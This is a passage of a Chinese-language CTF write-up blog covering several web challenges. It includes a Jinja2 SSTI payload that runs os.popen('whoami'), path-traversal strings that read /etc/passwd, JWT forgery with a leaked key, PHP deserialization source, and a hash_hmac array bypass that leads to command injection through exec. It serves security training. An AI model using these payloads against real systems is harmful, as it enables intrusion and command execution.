class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">a</span>=<span class="hljs-string">&#x27;__bui&#x27;</span>+&#x27;ltins__&#x27;%&#125;<br>&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">b</span>=<span class="hljs-string">&#x27;__im&#x27;</span>+&#x27;port__&#x27;%&#125;<br>&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">c</span>=<span class="hljs-string">&#x27;o&#x27;</span>+&#x27;s&#x27;%&#125;<br>&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">d</span>=<span class="hljs-string">&#x27;po&#x27;</span>+&#x27;pen&#x27;%&#125;<br>&#123;%<span class="hljs-built_in">print</span>(lipsum[<span class="hljs-string">&#x27;__globals__&#x27;</span>][a][b](c)[d](<span class="hljs-string">&#x27;whoami&#x27;</span>)[<span class="hljs-string">&#x27;read&#x27;</span>]())%&#125;<br></code></pre></td></tr></table></figure><h4 id="思路总结：-4"><a href="#思路总结：-4" class="headerlink" title="思路总结："></a>思路总结：</h4><p><code>&#123;&#123;&#125;&#125;</code>绕过，<code>lipsum</code>方法。</p><p><a href="https://xz.aliyun.com/t/6885?time__1311=n4+xnD0DRDyB5q053b7Yi=YG=kphrOqD5x&alichlgref=https://xz.aliyun.com/t/6885#toc-4">参考文章</a></p><p><a href="https://www.cnblogs.com/2ha0yuk7on/p/16648850.html#%E5%B8%B8%E8%A7%84%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF">参考文章</a></p><p><a href="https://www.cnblogs.com/Article-kelp/p/14797393.html">参考文章</a></p><h2 id="BSidesCF-2020-Hurdles"><a href="#BSidesCF-2020-Hurdles" class="headerlink" title="[BSidesCF 2020]Hurdles"></a>[BSidesCF 2020]Hurdles</h2><p><code>/hurdles</code>:</p><p><img src="/img/BSidesCF2020Hurdles2.png" alt="BSidesCF2020Hurdles2"></p><p>抓包修改请求方式<code>PUT</code>:</p><p><img src="/img/BSidesCF2020Hurdles3.png" alt="BSidesCF2020Hurdles3"></p><p><code>/hurdles/!</code></p><p><img src="/img/BSidesCF2020Hurdles4.png" alt="BSidesCF2020Hurdles4"></p><p><code>PUT /hurdles/!?get=flag</code></p><p><img src="/img/BSidesCF2020Hurdles5.png" alt="BSidesCF2020Hurdles5"></p><p><code>/hurdles/!?get=flag&amp;%26%3D%26%3D%26=1</code>注意这里要给他<code>URL</code>编码。。。</p><p><img src="/img/BSidesCF2020Hurdles6.png" alt="BSidesCF2020Hurdles6"></p><p><code>/hurdles/!?get=flag&amp;%26%3d%26%3d%26=%2500%0A</code>注意这里<code>%25</code>是<code>%</code>的<code>URL</code>编码，后面还要加个<code>%0A</code>换行符。</p><p><img src="/img/BSidesCF2020Hurdles7.png" alt="BSidesCF2020Hurdles7"></p><p>添加<code>Authorization: Basic cGxheWVyOjEyMzQ1Ng==</code>字段即可。</p><p>当然也可以用<code>curl</code>这个工具：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">curl</span> -X PUT &#x27;http://node5.buuoj.cn:<span class="hljs-number">26300</span>/hurdles/!?get=flag&amp;%<span class="hljs-number">26</span>%<span class="hljs-number">3</span>D%<span class="hljs-number">26</span>%<span class="hljs-number">3</span>D%<span class="hljs-number">26</span>=%<span class="hljs-number">2500</span>%<span class="hljs-number">0</span>a&#x27; -u &#x27;player:<span class="hljs-number">123456</span>&#x27;<br></code></pre></td></tr></table></figure><blockquote><p>I’m sorry, Basically, I was expecting the password of the hex representation of the md5 of the string ‘open sesame’</p></blockquote><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">curl</span> -X PUT &#x27;http://node5.buuoj.cn:<span class="hljs-number">26300</span>/hurdles/!?get=flag&amp;%<span class="hljs-number">26</span>%<span class="hljs-number">3</span>D%<span class="hljs-number">26</span>%<span class="hljs-number">3</span>D%<span class="hljs-number">26</span>=%<span class="hljs-number">2500</span>%<span class="hljs-number">0</span>a&#x27; -u &#x27;player:<span class="hljs-number">54</span>ef36ec71201fdf9d1423fd26f97f6b&#x27;<br></code></pre></td></tr></table></figure><blockquote><p>I’m sorry, I was expecting you to be using a 1337 Browser.</p></blockquote><p>后面懒得写了：</p><p><img src="/img/BSidesCF2020Hurdles8.png" alt="BSidesCF2020Hurdles8"></p><h4 id="思路总结-5"><a href="#思路总结-5" class="headerlink" title="思路总结"></a>思路总结</h4><p><code>X-Forwarded-For</code>实际可能有多个，第一项是真实的<code>IP</code>;注意<code>URL</code>编码。<code>Authorization</code>认证头需要<code>base64</code>编码。</p><h2 id="DDCTF-2019-homebrew-event-loop"><a href="#DDCTF-2019-homebrew-event-loop" class="headerlink" title="[DDCTF 2019]homebrew event loop"></a>[DDCTF 2019]homebrew event loop</h2><p>环境打不开，后面在做</p><h2 id="virink-2019-files-share"><a href="#virink-2019-files-share" class="headerlink" title="virink_2019_files_share"></a>virink_2019_files_share</h2><p><img src="/img/virink_2019_files_share1.png" alt="virink_2019_files_share1"></p><p><code>URL</code>前加<code>view-source</code>字段看看：</p><p><img src="/img/virink_2019_files_share2.png" alt="virink_2019_files_share2"></p><p><img src="/img/virink_2019_files_share3.png" alt="virink_2019_files_share3"></p><p><img src="/img/virink_2019_files_share5.png" alt="virink_2019_files_share5"></p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs groovy"><span class="hljs-regexp">/preview?f=/</span>etc/passwd<br>&#123;<span class="hljs-string">&quot;msg&quot;</span>:<span class="hljs-string">&quot;File \/epasswd not found!&quot;</span>,<span class="hljs-string">&quot;code&quot;</span>:<span class="hljs-number">1</span>&#125;   过滤了tc/ <br>过滤了../<br>preview?f=<span class="hljs-regexp">/.../</span>.<span class="hljs-regexp">/.../</span>.<span class="hljs-regexp">/.../</span>.<span class="hljs-regexp">/.../</span>.<span class="hljs-regexp">/.../</span>.<span class="hljs-regexp">/.../</span>.<span class="hljs-regexp">/etctc/</span><span class="hljs-regexp">/passwd可以读/</span>etc/passwd<br>其实就是简单的替换为空，双写就能绕过<br>然后目录遍历拿flag，不过这个flag在目标文件夹下<br>测试的时候发现单独一个/也会被过滤，不过写成：<br>preview?f=<span class="hljs-regexp">/.../</span>.<span class="hljs-regexp">/.../</span>.<span class="hljs-regexp">/.../</span>.<span class="hljs-regexp">/.../</span>.<span class="hljs-regexp">/.../</span>.<span class="hljs-regexp">/.../</span>.<span class="hljs-regexp">/f1ag_Is_h3re../</span>/flag<br>还是能读flag。。感觉他这个过滤规则挺奇怪的<br><br></code></pre></td></tr></table></figure><h4 id="思路总结-6"><a href="#思路总结-6" class="headerlink" title="思路总结"></a>思路总结</h4><p>目录遍历，<code>/uploads/</code></p><h2 id="安洵杯-2019-iamthinking"><a href="#安洵杯-2019-iamthinking" class="headerlink" title="[安洵杯 2019]iamthinking"></a>[安洵杯 2019]iamthinking</h2><p><code>/public/</code>发现是张图片</p><h2 id="RootersCTF2019-ImgXweb"><a href="#RootersCTF2019-ImgXweb" class="headerlink" title="[RootersCTF2019]ImgXweb"></a>[RootersCTF2019]ImgXweb</h2><p>文件上传，注册账号时发现<code>admin</code>已经存在。随便注册一个发现是文件上传。可以上传图片甚至<code>php</code>文件，不过上传之后找不到文件路径，只会显示这么个东西：</p><p><img src="/img/imgxweb2.png" alt="imgxweb2"></p><p>本来想着抓包看下<code>php</code>文件上传到哪了，结果发现这么个东西：</p><p><img src="/img/imgxweb1.png" alt="imgxweb1"></p><p>这东西看着像<code>JWT</code>，拿着去解一下：</p><p><img src="/img/imgxweb4.png" alt="imgxweb4"></p><p>给了注册的用户名，初步判断<code>JWT</code>伪造个<code>admin</code>，现在要找<code>secret_key</code></p><p>访问<code>robots.txt</code>直接给了<code>/static/secretkey.txt</code>，里面是这么个东西：</p><p><code>you-will-never-guess</code></p><p>吗的，他一开始里面这么写我还以为这是个假的密钥，想了半天怎么去弄真的结果看了<code>wp</code>发现就是用这个。。TAT</p><p>后面就是改<code>session_id</code>然后会出现<code>flag.png</code>这个东西，直接访问对应路径就行。</p><h4 id="思路总结-7"><a href="#思路总结-7" class="headerlink" title="思路总结"></a>思路总结</h4><p><code>JWT</code>伪造</p><h2 id="2020-新春红包题-1"><a href="#2020-新春红包题-1" class="headerlink" title="[2020 新春红包题]1"></a>[2020 新春红包题]1</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><code class="hljs php">/?src=<span class="hljs-number">1</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$store</span>;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$key</span>;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$expire</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$store</span>, <span class="hljs-variable">$key</span> = <span class="hljs-string">&#x27;flysystem&#x27;</span>, <span class="hljs-variable">$expire</span> = <span class="hljs-literal">null</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;key = <span class="hljs-variable">$key</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;store = <span class="hljs-variable">$store</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;expire = <span class="hljs-variable">$expire</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">cleanContents</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$contents</span></span>) </span>&#123;<br>        <span class="hljs-variable">$cachedProperties</span> = <span class="hljs-title function_ invoke__">array_flip</span>([<br>            <span class="hljs-string">&#x27;path&#x27;</span>, <span class="hljs-string">&#x27;dirname&#x27;</span>, <span class="hljs-string">&#x27;basename&#x27;</span>, <span class="hljs-string">&#x27;extension&#x27;</span>, <span class="hljs-string">&#x27;filename&#x27;</span>,<br>            <span class="hljs-string">&#x27;size&#x27;</span>, <span class="hljs-string">&#x27;mimetype&#x27;</span>, <span class="hljs-string">&#x27;visibility&#x27;</span>, <span class="hljs-string">&#x27;timestamp&#x27;</span>, <span class="hljs-string">&#x27;type&#x27;</span>,<br>        ]);<br><br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$contents</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$path</span> =&gt; <span class="hljs-variable">$object</span>) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$object</span>)) &#123;<br>                <span class="hljs-variable">$contents</span>[<span class="hljs-variable">$path</span>] = <span class="hljs-title function_ invoke__">array_intersect_key</span>(<span class="hljs-variable">$object</span>, <span class="hljs-variable">$cachedProperties</span>);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$contents</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getForStorage</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$cleaned</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">cleanContents</span>(<span class="hljs-variable">$this</span>-&gt;cache);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-variable">$cleaned</span>, <span class="hljs-variable">$this</span>-&gt;complete]);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">save</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$contents</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getForStorage</span>();<br><br>        <span class="hljs-variable language_">$this</span>-&gt;store-&gt;<span class="hljs-title function_ invoke__">set</span>(<span class="hljs-variable">$this</span>-&gt;key, <span class="hljs-variable">$contents</span>, <span class="hljs-variable">$this</span>-&gt;expire);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">$this</span>-&gt;autosave) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">save</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getExpireTime</span>(<span class="hljs-params"><span class="hljs-variable">$expire</span></span>): <span class="hljs-title">int</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-keyword">int</span>) <span class="hljs-variable">$expire</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getCacheKey</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$name</span></span>): <span class="hljs-title">string</span> </span>&#123;<br>        <span class="hljs-comment">// 使缓存文件名随机</span><br>        <span class="hljs-variable">$cache_filename</span> = <span class="hljs-variable language_">$this</span>-&gt;options[<span class="hljs-string">&#x27;prefix&#x27;</span>] . <span class="hljs-title function_ invoke__">uniqid</span>() . <span class="hljs-variable">$name</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$cache_filename</span>, -<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-string">&#x27;.php&#x27;</span>)) === <span class="hljs-string">&#x27;.php&#x27;</span>) &#123;<br>          <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;?&#x27;</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$cache_filename</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">serialize</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>): <span class="hljs-title">string</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$data</span>)) &#123;<br>            <span class="hljs-keyword">return</span> (<span class="hljs-keyword">string</span>) <span class="hljs-variable">$data</span>;<br>        &#125;<br><br>        <span class="hljs-variable">$serialize</span> = <span class="hljs-variable language_">$this</span>-&gt;options[<span class="hljs-string">&#x27;serialize&#x27;</span>];<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$serialize</span>(<span class="hljs-variable">$data</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">set</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$value</span>, <span class="hljs-variable">$expire</span> = <span class="hljs-literal">null</span></span>): <span class="hljs-title">bool</span></span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;writeTimes++;<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_null</span>(<span class="hljs-variable">$expire</span>)) &#123;<br>            <span class="hljs-variable">$expire</span> = <span class="hljs-variable language_">$this</span>-&gt;options[<span class="hljs-string">&#x27;expire&#x27;</span>];<br>        &#125;<br><br>        <span class="hljs-variable">$expire</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getExpireTime</span>(<span class="hljs-variable">$expire</span>);<br>        <span class="hljs-variable">$filename</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getCacheKey</span>(<span class="hljs-variable">$name</span>);<br><br>        <span class="hljs-variable">$dir</span> = <span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-variable">$filename</span>);<br><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$dir</span>)) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$dir</span>, <span class="hljs-number">0755</span>, <span class="hljs-literal">true</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (\<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;<br>                <span class="hljs-comment">// 创建失败</span><br>            &#125;<br>        &#125;<br><br>        <span class="hljs-variable">$data</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$value</span>);<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;options[<span class="hljs-string">&#x27;data_compress&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">function_exists</span>(<span class="hljs-string">&#x27;gzcompress&#x27;</span>)) &#123;<br>            <span class="hljs-comment">//数据压缩</span><br>            <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">gzcompress</span>(<span class="hljs-variable">$data</span>, <span class="hljs-number">3</span>);<br>        &#125;<br><br>        <span class="hljs-variable">$data</span> = <span class="hljs-string">&quot;&lt;?php\n//&quot;</span> . <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&#x27;%012d&#x27;</span>, <span class="hljs-variable">$expire</span>) . <span class="hljs-string">&quot;\n exit();?&gt;\n&quot;</span> . <span class="hljs-variable">$data</span>;<br>        <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$data</span>);<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$filename</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;src&#x27;</span>]))<br>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-variable">$dir</span> = <span class="hljs-string">&quot;uploads/&quot;</span>;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$dir</span>))<br>&#123;<br>    <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$dir</span>);<br>&#125;<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;data&quot;</span>]);<br></code></pre></td></tr></table></figure><h2 id="羊城杯-2020-Blackcat"><a href="#羊城杯-2020-Blackcat" class="headerlink" title="[羊城杯 2020]Blackcat"></a>[羊城杯 2020]Blackcat</h2><p>右键源码，<code>mp3</code>文件中存在：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Black-Cat-Sheriff&#x27;</span>]) || <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;One-ear&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;谁！竟敢踩我一只耳的尾巴！&#x27;</span>);<br>&#125;<br><br><span class="hljs-variable">$clandestine</span> = <span class="hljs-title function_ invoke__">getenv</span>(<span class="hljs-string">&quot;clandestine&quot;</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;White-cat-monitor&#x27;</span>]))<br>    <span class="hljs-variable">$clandestine</span> = <span class="hljs-title function_ invoke__">hash_hmac</span>(<span class="hljs-string">&#x27;sha256&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;White-cat-monitor&#x27;</span>], <span class="hljs-variable">$clandestine</span>);<br><br><br><span class="hljs-variable">$hh</span> = <span class="hljs-title function_ invoke__">hash_hmac</span>(<span class="hljs-string">&#x27;sha256&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;One-ear&#x27;</span>], <span class="hljs-variable">$clandestine</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$hh</span> !== <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Black-Cat-Sheriff&#x27;</span>])&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;有意瞄准，无意击发，你的梦想就是你要瞄准的目标。相信自己，你就是那颗射中靶心的子弹。&#x27;</span>);<br>&#125;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;nc&quot;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;One-ear&#x27;</span>]);<br><br></code></pre></td></tr></table></figure><p>代码倒是不难理解：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$clandestine</span> = <span class="hljs-title function_ invoke__">getenv</span>(<span class="hljs-string">&quot;clandestine&quot;</span>);<span class="hljs-comment">//这里获取了环境变量中clandestine的值，后面会把它当成加密密钥</span><br><span class="hljs-variable">$clandestine</span> = <span class="hljs-title function_ invoke__">hash_hmac</span>(<span class="hljs-string">&#x27;sha256&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;White-cat-monitor&#x27;</span>], <span class="hljs-variable">$clandestine</span>);<span class="hljs-comment">//使用刚才那个加密密钥+sha256算法对POST的对应内容进行加密，然后赋值给$clandestine，这东西是下一段加密的密钥</span><br><span class="hljs-variable">$hh</span> = <span class="hljs-title function_ invoke__">hash_hmac</span>(<span class="hljs-string">&#x27;sha256&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;One-ear&#x27;</span>], <span class="hljs-variable">$clandestine</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$hh</span> !== <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Black-Cat-Sheriff&#x27;</span>])<span class="hljs-comment">//这里如果相等会执行：</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;nc&quot;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;One-ear&#x27;</span>]);<br></code></pre></td></tr></table></figure><p><code>hash_hmac</code>这东西特性和<code>md5</code>一样，如果给一个数组加密他直接就返回<code>NULL</code>了(不考虑报错)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$data</span> = [<span class="hljs-number">0</span>];<br><br><span class="hljs-variable">$hmac</span> = <span class="hljs-title function_ invoke__">hash_hmac</span>(<span class="hljs-string">&#x27;sha256&#x27;</span>, <span class="hljs-variable">$data</span>, <span class="hljs-variable">$key</span>);<br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$hmac</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//结果:</span><br>Warning: <span class="hljs-title function_ invoke__">hash_hmac</span>() expects parameter <span class="hljs-number">2</span> to be <span class="hljs-keyword">string</span>, <span class="hljs-keyword">array</span> given in /box/script.php on line <span class="hljs-number">4</span><br><span class="hljs-literal">NULL</span><br></code></pre></td></tr></table></figure><p><code>One-ear</code>就是后面要执行的命令，现在密钥有了很容易求对应加密出的<code>$hh</code></p><p>接下来是<code>exec</code>命令执行：</p><p><code>exec</code>命令执行有关回显的问题：</p><p>首先这东西只返回命令执行结果的最后一行，而不会将输出直接发送到浏览器或者命令行(不过题目中和<code>echo</code>搭配使用了)：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<br><br><span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<span class="hljs-comment">//这东西没输出</span><br><br><span class="hljs-keyword">echo</span>(<span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&#x27;ls&#x27;</span>));<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//结果：</span><br>run<br>script.php<br>script.php<br></code></pre></td></tr></table></figure><p>前面放了个<code>nc</code>所以要用分号给它分开(类似<code>system</code>同时执行多个命令)。</p><p>先是很多师傅用的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//生成hash</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$data</span> = [<span class="hljs-number">0</span>];<br><span 